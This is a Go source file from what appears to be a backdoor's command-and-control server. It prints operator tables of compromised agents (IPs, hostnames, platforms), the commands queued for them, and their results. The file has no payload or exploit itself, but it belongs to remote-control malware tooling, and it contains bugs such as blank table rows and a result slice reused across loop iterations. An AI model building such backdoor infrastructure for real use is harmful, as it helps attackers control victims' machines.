package cli

import (
	"fmt"
	"github.com/olekukonko/tablewriter"
	"go-sec/backdoor/command-control/server/models"
	"os"
)

func DisplayAgent(agents []models.Agent) {
	data := make([][]string, len(agents))
	for _, agent := range agents {
		agentInfo := make([]string, 0)
		agentInfo = append(agentInfo,
			fmt.Sprintf("%v", agent.AgentId),
			fmt.Sprintf("%v", agent.Ips),
			fmt.Sprintf("%v", agent.HostName),
			fmt.Sprintf("%v", agent.PlatForm))
		data = append(data, agentInfo)
	}

	if len(data) > 0 {
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"agent_id", "ips", "hostname", "platform"})
		table.SetAlignment(tablewriter.ALIGN_CENTER)
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoMergeCells(true)
		table.AppendBulk(data)
		table.SetCaption(true, "Agent List")
		table.Render()
	}
}


func DisplayCommand(commands []models.Command) {
	data := make([][]string, 0)
	for _, cmd := range commands {
		cmdList := make([]string, 0)
		cmdList = append(cmdList,
			fmt.Sprintf("%v", cmd.AgentId),
			fmt.Sprintf("%v", cmd.Content),
			fmt.Sprintf("%v", cmd.CreateTime),
			fmt.Sprintf("%v", cmd.Status),
		)
		data = append(data, cmdList)
	}

	if len(data) > 0 {
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"agent_id", "command", "crete_time", "status"})
		table.SetAlignment(tablewriter.ALIGN_CENTER)
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoMergeCells(true)
		table.AppendBulk(data)
		table.SetCaption(true, "Command List")
		table.Render()
	}

}

func DisplayCmdResult() {
	data := make([][]string, 0)
	cmds, err := models.ListFinishCommand()
	if err == nil && len(cmds) > 0 {
		result := make([]string, 0)
		for _, cmd := range cmds {
			// 修改任务状态为已经展示
			cmdId := cmd.Id
			err := models.SetCmdStatusToEnd(cmdId)
			_ = err

			result = append(result,
				fmt.Sprintf("%v", cmd.AgentId),
				fmt.Sprintf("%v", cmd.Content),
				fmt.Sprintf("%v", cmd.UpdateTime),
				fmt.Sprintf("%v", cmd.Result),
			)
			data = append(data, result)
		}

		message("note", "command execute result")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"agent_id", "command", "run_time", "result"})
		table.SetAlignment(tablewriter.ALIGN_CENTER)
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoMergeCells(true)
		table.AppendBulk(data)
		table.SetCaption(true, "Command Result")
		table.Render()
	}
}

